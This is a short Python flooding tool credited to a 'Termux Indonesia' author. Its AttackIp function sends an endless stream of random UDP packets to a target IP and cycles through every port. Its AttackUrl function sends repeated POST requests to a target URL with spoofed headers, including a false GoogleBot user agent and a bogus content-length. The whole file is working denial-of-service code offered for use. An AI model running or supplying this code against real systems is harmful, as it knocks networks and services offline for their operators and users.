import sys
import os
import time
import socket
import random
import requests



from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)


"""
Author   : Rio Agung Purnomo
TEAM     : Termux Indonesia
Thanks   : All Member Termux Indonesia
Tingkat  : Programmer & Developer
https://termuxid.dev"
"""

h = {
  "content-length" : "1000000000000000000",
  "connection" : "close",
  "user-agent" : "GoogleBot V3",
  "x-forwarded-from" : "0.0.0.0",
  "content-type" : "application/xml",
  "set-cookie" : "v=xxxxXxxxxxx;&vx=#xxxxxxxxxxxxxxxx0x;;d;"
  }

data = {
  "X" : "xXxxX",
  "Y" : "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
  }

def AttackIp(ip,port):
  print("[                ] 0% ")
  #time.sleep(5)
  print("[====            ] 25% ")
  #time.sleep(5)
  print("[========        ] 50% ")
 # time.sleep(5)
  print("[==========      ] 75% ")
  #time.sleep(5)
  print("[================] 100% ")
  sent = 0
  while True:
    sock.sendto(bytes,(ip,port))
    sent = sent + 1
    port = port + 1
    print("Sent %s packet to %s throught port:%s"%(sent,ip,port))
    if port == 65534:
       port = 1


def AttackUrl(url,amount=False):
  if amount == False:
    amount = 100
  for i in range(1,int(amount)):
    req = requests.post(url,data=data,headers=h)
    print("Send {}, respon {}".format(i,req.status_code))